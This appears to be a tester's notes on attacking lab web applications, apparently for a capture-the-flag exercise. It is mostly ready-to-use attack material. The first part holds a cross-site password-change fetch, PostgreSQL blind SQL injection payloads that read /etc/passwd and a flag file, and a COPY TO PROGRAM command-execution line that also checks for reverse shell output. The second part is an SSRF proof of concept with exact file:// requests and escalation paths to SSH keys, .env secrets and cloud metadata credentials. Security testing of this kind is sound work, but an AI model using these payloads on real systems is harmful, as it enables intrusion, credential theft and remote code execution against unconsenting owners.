Fetch -> sql website with rabbit

fetch("https://192.168.62.62:8443/api/me/password", {
  method: "POST",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
  },
  body: "password=testtest",
  credentials: "include"
});


version
00000000-0000-0000-0000-000000000000'; (SELECT CAST(ASCII(SUBSTRING(version(),1,1)) AS integer))--
cant be tested multiple times
SUBSTRING(version(),2,1)
SUBSTRING(version(),3,1)

current user
00000000-0000-0000-0000-000000000000'; (SELECT CAST(ASCII(SUBSTRING(current_user,1,1)) AS integer))--

superuser 1 if yes 0 if no
00000000-0000-0000-0000-000000000000'; (SELECT CAST((SELECT CASE WHEN rolsuper THEN 1 ELSE 0 END FROM pg_roles WHERE rolname = current_user) AS integer))--



read file
00000000-0000-0000-0000-000000000000'; (SELECT CAST(LENGTH(pg_read_file('/etc/passwd', 0, 1000)) AS integer))--



shell if superuser
COPY (SELECT '') TO PROGRAM 'id > /tmp/test.txt';


Check if file readable	
' ; (SELECT CAST(LENGTH(pg_read_file('/etc/passwd',0,1000)) AS integer))--

Extract 1 char	
' ; (SELECT CAST(ASCII(SUBSTRING(pg_read_file('/etc/passwd',0,1000),1,1)) AS integer))--

Check for flag file	
' ; (SELECT CAST(LENGTH(pg_read_file('/flag.txt',0,1000)) AS integer))--

Dump flag.txt	
' ; (SELECT CAST(ASCII(SUBSTRING(pg_read_file('/flag.txt',0,1000),1,1)) AS integer))--

RCE file existence check	
' ; (SELECT CAST(LENGTH(pg_read_file('/tmp/test.txt',0,100)) AS integer))--

Check for reverse shell output	
' ; (SELECT CAST(ASCII(SUBSTRING(pg_read_file('/tmp/shell.log',0,100),1,1)) AS integer))--



POC: SSRF → Local File Disclosure (one-page, copy-pasteable)

Target: http://192.168.62.68
Finding: Server accepts user-supplied URL and fetches arbitrary file:// URIs — confirmed by returned /etc/passwd content.
Severity: High → Local file disclosure; potential for further pivot (internal services, cloud metadata).
Scope / Authorization: Only test if authorized. Do not perform out-of-scope destructive actions.

Reproduction (exact steps)

Log in (if required) and navigate to Orders → Start New Order (or /orders/new).

In Model Content → Get Content from URL enter:

file:///etc/passwd


Submit the order and/or click Save / Submit.

Visit the order details page (/orders/1 or the order id created). The page displays content similar to:

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin


Evidence: screenshot(s) of the order details showing the /etc/passwd contents (already captured).

Exact example HTTP request (form-encoded)

POST /orders/new HTTP/1.1
Host: 192.168.62.68
Content-Type: application/x-www-form-urlencoded

material=Plastic&model_url=file:///etc/passwd&action=submit

Impact & Attack Surface

Confirmed: Arbitrary local file read via file:// SSRF (server-side fetch echoes file content into order details).

Possible escalation paths:

Read app config files (e.g. .env, config.php) → DB credentials, API keys.

Read SSH private keys (/root/.ssh/id_rsa) or service keys → account/server takeover (very high).

Access internal HTTP services (127.0.0.1:5984, :9200, :2375, etc.) → unauthenticated admin APIs.

Cloud metadata (169.254.169.254) → IAM credentials (critical).

Notes: Order status changes to Under Review indicate an automated or admin-triggered fetch (blind SSRF risk).

Safe test payloads (non-destructive)

file:///etc/passwd — confirmed.

file:///var/www/.env — look for DB creds, API keys.

file:///etc/nginx/nginx.conf or file:///etc/apache2/sites-enabled/000-default.conf — server vhost info.

http://127.0.0.1:5984/ — CouchDB banner (if present).

OOB detection (blind SSRF): http://<your-collab-id>.burpcollaborator.net/<unique> — use only to detect callbacks.

Do not retrieve or exfiltrate secrets (SSH keys, tokens, metadata creds) unless explicitly authorized.
